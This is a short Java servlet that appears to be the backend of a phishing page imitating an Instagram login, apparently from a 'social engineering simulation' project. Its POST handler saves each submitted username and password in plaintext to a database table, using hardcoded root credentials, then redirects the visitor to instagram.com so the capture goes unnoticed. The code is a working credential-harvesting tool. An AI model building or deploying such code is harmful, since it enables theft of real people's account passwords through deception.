package soesim;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

/**
 * Servlet implementation class LoginServlet
 */
@WebServlet("/login")
public class LoginServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public LoginServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		
		

	        String url = "jdbc:mysql://localhost:3306/socialsimdb";
	        String dbUser = "root";
	        String dbPass = "root";

	        try {
	            Class.forName("com.mysql.cj.jdbc.Driver");
	            Connection conn = DriverManager.getConnection(url, dbUser, dbPass);
	            System.out.println("Connection Established");
	            String username = request.getParameter("username");
		        String password = request.getParameter("password");
	            PreparedStatement stmt = conn.prepareStatement("INSERT INTO user_logs (username, password) VALUES (?, ?)");
	            stmt.setString(1, username);
	            stmt.setString(2, password);
	            stmt.executeUpdate();
	           
	            conn.close();
	        } catch (Exception e) {

	            e.printStackTrace();
	        }

	        response.sendRedirect("https://www.instagram.com");
    }

	}


